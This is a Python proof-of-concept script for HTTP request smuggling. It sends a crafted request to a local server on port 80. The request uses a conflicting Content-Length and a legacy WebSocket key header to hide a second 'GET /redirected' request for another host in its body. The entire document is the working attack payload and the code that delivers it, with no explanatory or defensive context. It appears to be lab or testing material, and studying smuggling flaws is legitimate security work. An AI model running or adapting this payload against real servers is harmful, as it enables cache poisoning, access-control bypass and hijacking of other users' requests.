import socket
import sys

SERVER = "127.0.0.1"
PORT = 80

PAYLOAD = (
    b"GET / HTTP/1.1\r\n" +
    b"Host: localhost\r\n" +
    b"Content-Length: 61\r\n" +
    b"Sec-Websocket-Key1: x\r\n" + 
    b"\r\n" +
    b"xxxxxxxxGET /redirected HTTP/1.1\r\n" +
    b"Host: www.example.com\r\n" +  
    b"X: x"
)

def visualise_payload():
    print(PAYLOAD.decode().replace("\r\n", "\\r\\n\r\n"))

def main():
    visualise_payload()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setblocking(True)
    sock.connect((SERVER, PORT))
    sock.send(PAYLOAD)
    sock.close()

if __name__  == "__main__":
    main()
